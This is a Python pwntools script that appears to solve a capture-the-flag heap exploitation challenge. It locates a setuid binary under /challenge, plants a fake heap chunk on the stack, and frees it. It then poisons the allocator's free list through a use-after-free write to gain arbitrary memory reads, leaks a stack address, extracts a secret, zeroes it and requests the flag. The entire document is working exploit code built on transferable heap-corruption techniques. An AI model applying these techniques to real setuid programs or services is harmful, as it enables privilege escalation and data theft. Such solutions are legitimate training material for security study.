import sys
import pwn

pwn.context.update(arch="amd64", os="linux", terminal=["tmux", "new-window"])


def tee[T: pwn.tube](process: T) -> T:
    orig_recv_raw = process.recv_raw
    output = sys.__stdout__.buffer  # type: ignore sys.stdout is replaced by pwn.term

    def recv_raw(numb, *args, **kwargs):
        data = orig_recv_raw(numb, *args, **kwargs) or b""  # orig may return str('')
        output.write(data)
        output.flush()
        return data

    process.recv_raw = recv_raw
    return process


def find_challenge(search_path="/challenge"):
    from pathlib import Path
    import os
    import stat

    xs = [
        str(f.absolute())
        for f in Path(search_path).iterdir()
        if f.is_file() and os.access(f, os.X_OK) and (f.stat().st_mode & stat.S_ISUID)
    ]
    if not xs:
        raise FileNotFoundError(f"No executable found in {search_path}")
    if len(xs) > 1:
        raise FileNotFoundError(f"Multiple executables found in {search_path}")
    return xs[0]


def one_round(io: pwn.process):
    tee(io)

    def read_puts(idx):
        io.sendline(b"puts %d" % idx)
        io.recvuntil(b"Data: ")
        return io.recvline(False)

    def malloc_addr(addr, idx):
        io.sendline(b"malloc %d 16" % idx)
        io.sendline(b"malloc 15 16")
        io.sendline(b"free %d" % idx)
        io.sendline(b"free 15")
        io.sendline(b"scanf 15")
        io.sendline(pwn.p64(addr))
        io.sendline(b"malloc %d 16" % idx)
        io.sendline(b"malloc %d 16" % idx)

    def read_qword(addr):
        # key will be zeroed by malloc, so only 8 bytes is readable
        malloc_addr(addr, 0)
        return read_puts(0)

    def clean_qword(addr):
        malloc_addr(addr - 0x8, 0)

    rbp_scanf = 0x170
    rbp_free = 0x130
    rbp_secret = 0xA6
    offset_tofree = rbp_scanf - rbp_free  # offset from scanf to free ptr
    io.sendline(b"stack_scanf")
    io.sendline(
        pwn.flat(
            {
                offset_tofree - 0x10: 0x00,  # PREV_SIZE
                offset_tofree - 0x08: 0x21,  # SIZE
            }
        )
    )
    io.sendline(b"malloc 0 16")
    io.sendline(b"stack_free")
    io.sendline(b"free 0")

    addr_on_stack = pwn.u64(read_puts(0).ljust(8, b"\x00"))
    offset_secret = rbp_free - rbp_secret
    secret = b"".join(
        [
            read_qword(addr_on_stack + offset_secret + 0x8),
            read_qword(addr_on_stack + offset_secret + 0x0),
        ][::-1]
    )
    pwn.success(secret.decode())  # or rerun with this secret
    clean_qword(addr_on_stack + offset_secret)
    io.sendline(b"send_flag")
    io.sendline(b"\0" * 16)

    io.sendline(b"quit")
    io.recvrepeat()


def ctf():
    root_bin = find_challenge()
    with pwn.process(root_bin, raw=True, level="error") as io:
        one_round(io)


if __name__ == "__main__":
    ctf()
